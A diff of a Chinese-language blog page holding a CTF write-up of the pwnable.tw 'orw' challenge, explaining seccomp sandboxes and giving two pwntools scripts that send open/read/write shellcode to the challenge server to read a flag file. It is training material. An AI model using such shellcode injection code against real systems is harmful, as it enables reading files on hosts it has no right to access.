@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="CTF,seccomp," />
 
 
 
@@ -83,15 +83,21 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="tags">
-<meta property="og:url" content="http://yoursite.com/tags/index.html">
+<meta name="description" content="题目显示Only open read write syscall are allowed to use.应该是使用了沙箱， 后门程序是用不成了，只能使用这三个函数直接读取flag。了  使用IDA Pro反汇编程序： 123456789101112131415161718192021222324252627.text:08048548                 lea     ecx, [e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup-of-pwnable.tw之orw">
+<meta property="og:url" content="http://yoursite.com/2020/03/21/Writeup-of-pwnable-tw%E4%B9%8Borw/index.html">
 <meta property="og:site_name" content="Nero&#39;s Blog">
+<meta property="og:description" content="题目显示Only open read write syscall are allowed to use.应该是使用了沙箱， 后门程序是用不成了，只能使用这三个函数直接读取flag。了  使用IDA Pro反汇编程序： 123456789101112131415161718192021222324252627.text:08048548                 lea     ecx, [e">
 <meta property="og:locale" content="zh">
-<meta property="article:published_time" content="2020-03-16T08:28:36.000Z">
-<meta property="article:modified_time" content="2020-03-16T08:29:00.098Z">
+<meta property="og:image" content="http://yoursite.com/2020/03/21/Writeup-of-pwnable-tw%E4%B9%8Borw/orw.png">
+<meta property="article:published_time" content="2020-03-21T04:52:46.000Z">
+<meta property="article:modified_time" content="2020-03-21T05:33:20.878Z">
 <meta property="article:author" content="Nero">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="seccomp">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/21/Writeup-of-pwnable-tw%E4%B9%8Borw/orw.png">
 
 
 
@@ -121,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/03/21/Writeup-of-pwnable-tw之orw/"/>
 
 
 
 
 
-  <title>tags | Nero's Blog</title>
+  <title>Writeup-of-pwnable.tw之orw | Nero's Blog</title>
   
 
 
@@ -286,40 +292,186 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/21/Writeup-of-pwnable-tw%E4%B9%8Borw/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Nero">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Nero's Blog">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">tags</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <div class="tag-cloud">
-            <div class="tag-cloud-title">
-                10 tags in total
-            </div>
-            <div class="tag-cloud-tags">
-              <a href="/tags/Algorithm/" style="font-size: 30px; color: #111">Algorithm</a> <a href="/tags/CTF/" style="font-size: 30px; color: #111">CTF</a> <a href="/tags/CVE/" style="font-size: 12px; color: #ccc">CVE</a> <a href="/tags/Windows/" style="font-size: 12px; color: #ccc">Windows</a> <a href="/tags/seccomp/" style="font-size: 12px; color: #ccc">seccomp</a> <a href="/tags/%E4%B8%B2/" style="font-size: 12px; color: #ccc">串</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 12px; color: #ccc">数据结构</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 12px; color: #ccc">栈溢出</a> <a href="/tags/%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95/" style="font-size: 12px; color: #ccc">模式匹配算法</a> <a href="/tags/%E7%BA%A6%E7%91%9F%E5%A4%AB%E9%97%AE%E9%A2%98/" style="font-size: 12px; color: #ccc">约瑟夫问题</a>
-            </div>
-          </div>
+          <h1 class="post-title" itemprop="name headline">Writeup-of-pwnable.tw之orw</h1>
         
-      </div>
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-21T12:52:46+08:00">
+                2020-03-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
+                    <span itemprop="name">技术分析</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <p>题目显示Only <code>open</code> <code>read</code> <code>write</code> syscall are allowed to use.应该是使用了沙箱，</p>
+<p>后门程序是用不成了，只能使用这三个函数直接读取flag。了</p>
+<p><img src="orw.png" alt=""></p>
+<p>使用IDA Pro反汇编程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:08048548                 lea     ecx, [esp+4]</span><br><span class="line">.text:0804854C                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804854F                 push    dword ptr [ecx-4]</span><br><span class="line">.text:08048552                 push    ebp</span><br><span class="line">.text:08048553                 mov     ebp, esp</span><br><span class="line">.text:08048555                 push    ecx</span><br><span class="line">.text:08048556                 sub     esp, 4</span><br><span class="line">.text:08048559                 call    orw_seccomp</span><br><span class="line">.text:0804855E                 sub     esp, 0Ch</span><br><span class="line">.text:08048561                 push    offset format   ; &quot;Give my your shellcode:&quot;</span><br><span class="line">.text:08048566                 call    _printf</span><br><span class="line">.text:0804856B                 add     esp, 10h</span><br><span class="line">.text:0804856E                 sub     esp, 4</span><br><span class="line">.text:08048571                 push    0C8h            ; nbytes</span><br><span class="line">.text:08048576                 push    offset shellcode ; buf</span><br><span class="line">.text:0804857B                 push    0               ; fd</span><br><span class="line">.text:0804857D                 call    _read</span><br><span class="line">.text:08048582                 add     esp, 10h</span><br><span class="line">.text:08048585                 mov     eax, offset shellcode</span><br><span class="line">.text:0804858A                 call    eax ; shellcode</span><br><span class="line">.text:0804858C                 mov     eax, 0</span><br><span class="line">.text:08048591                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048594                 leave</span><br><span class="line">.text:08048595                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048598                 retn</span><br><span class="line">.text:08048598 ; &#125; &#x2F;&#x2F; starts at 8048548</span><br><span class="line">.text:08048598 main            endp</span><br></pre></td></tr></table></figure>
+
+<p>可以得出整个程序的执行流程：</p>
+<p>首先，在0x08048559地址处调用了orw_seccomp，那么这东西是干嘛的呢？</p>
+<p><a href="[https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/#seccomp](https://blog.betamao.me/2019/01/23/Linux沙箱之seccomp/#seccomp)">sseccomp</a></p>
+<p>short for secure computing mode(<a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">wiki</a>)是一种限制系统调用的安全机制，可以当沙箱用。在严格模式下只支持<code>exit()</code>，<code>sigreturn()</code>，<code>read()</code>和<code>write()</code>，其他的系统调用都会杀死进程，过滤模式下可以指定允许那些系统调用，规则是bpf，可以使用<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a>查看</p>
+<p>在早期使用seccomp是使用prctl系统调用实现的，后来封装成了一个libseccomp库，可以直接使用<code>seccomp_init</code>,<code>seccomp_rule_add</code>,<code>seccomp_load</code>来设置过滤规则，但是我们学习的还是从prctl，这个系统调用是进行进程控制的，这里关注seccomp功能。<br>首先，要使用它需要有<code>CAP_SYS_ADMIN</code>权能，否则就要设置<code>PR_SET_NO_NEW_PRIVS</code>位，若不这样做非root用户使用这个程序时<code>seccomp</code>保护将会失效！设置了<code>PR_SET_NO_NEW_PRIVS</code>位后能保证<code>seccomp</code>对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，意思就是即使执行<code>execve</code>这个系统调用替换了整个binary权限不会变化，而且正如其名它设置以后就不能再改了，即使可以调用<code>ptctl</code>也不能再把它禁用掉。</p>
+<p>然后程序接下来将shellcode读到.bss段的0x804a060地址处，然后接下来直接使用call指令跳转到该处执行。</p>
+<p>直接写shellcode：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">"i386"</span>, os = <span class="string">"linux"</span>)</span><br><span class="line"><span class="comment">#p = process("./orw")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="string">"10001"</span>)</span><br><span class="line">ass = <span class="string">'''</span></span><br><span class="line"><span class="string">		 xor eax, eax</span></span><br><span class="line"><span class="string">		 push eax</span></span><br><span class="line"><span class="string">		 push 0x6761</span></span><br><span class="line"><span class="string">		 push 0x6c662f77</span></span><br><span class="line"><span class="string">		 push 0x726f2f65</span></span><br><span class="line"><span class="string">		 push 0x6d6f682f</span></span><br><span class="line"><span class="string">		 mov al, 0x05</span></span><br><span class="line"><span class="string">		 mov ebx, esp</span></span><br><span class="line"><span class="string">		 xor ecx, ecx</span></span><br><span class="line"><span class="string">		 int 0x80</span></span><br><span class="line"><span class="string">		 sub esp, 0x40</span></span><br><span class="line"><span class="string">		 mov ebx, eax</span></span><br><span class="line"><span class="string">		 mov al, 0x03</span></span><br><span class="line"><span class="string">		 mov ecx, esp</span></span><br><span class="line"><span class="string">		 mov dl, 0x40</span></span><br><span class="line"><span class="string">		 int 0x80</span></span><br><span class="line"><span class="string">		 mov al, 0x04</span></span><br><span class="line"><span class="string">		 mov bl, 0x01</span></span><br><span class="line"><span class="string">		 mov ecx, esp</span></span><br><span class="line"><span class="string">		 mov dl, 0x40</span></span><br><span class="line"><span class="string">		 int 0x80</span></span><br><span class="line"><span class="string">	  '''</span></span><br><span class="line">shellcode = asm(ass)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">s = p.recv(<span class="number">0x40</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure>
+
+<p>后来看到网上有人写的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">myelf = ELF(<span class="string">"./orw"</span>)</span><br><span class="line"><span class="comment">#io = process(myelf.path)</span></span><br><span class="line">io  = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += shellcraft.i386.pushstr(<span class="string">'/home/orw/flag'</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">'SYS_open'</span>,<span class="string">"esp"</span>, <span class="number">0</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">'SYS_read'</span>,<span class="string">"eax"</span>, <span class="number">0x0804A0D7</span>,<span class="number">40</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">'SYS_write'</span>,<span class="number">1</span>, <span class="number">0x0804A0D7</span>,<span class="number">40</span>).rstrip()</span><br><span class="line"><span class="comment">#print shellcode</span></span><br><span class="line"><span class="comment">#print len(asm(shellcode))</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(asm(shellcode))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>觉得自己好憨啊。唉，学到了。原来pwntools真的是个神器。</p>
+
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/seccomp/" rel="tag"># seccomp</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/20/Writeup-of-pwnable-tw%E4%B9%8Bstart/" rel="next" title="Writeup of pwnable.tw之start">
+                <i class="fa fa-chevron-left"></i> Writeup of pwnable.tw之start
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
